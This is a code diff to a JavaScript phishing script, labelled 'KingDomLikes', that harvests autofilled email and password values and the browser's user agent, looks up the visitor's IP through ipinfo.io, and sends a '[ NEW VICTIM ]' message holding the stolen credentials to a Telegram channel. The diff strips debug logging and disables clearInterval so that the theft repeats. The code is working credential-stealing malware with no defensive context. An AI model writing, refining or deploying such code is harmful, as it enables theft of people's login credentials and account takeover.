@@ -23,7 +23,6 @@ function getAutofilledValues() {
   var password = document.getElementById(`password`).value;
   var userAgent = navigator.userAgent;
 
-  console.log(email);
   if (email !== ``) {
     fetch('https://ipinfo.io/json')
       .then(response => response.json())
@@ -35,8 +34,6 @@ function getAutofilledValues() {
           var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}`;
           sendTelegramMessage(message); 
       });
-    clearInterval(intervalId);
+    // clearInterval(intervalId);
   };
-  
-  console.log(email);
 }
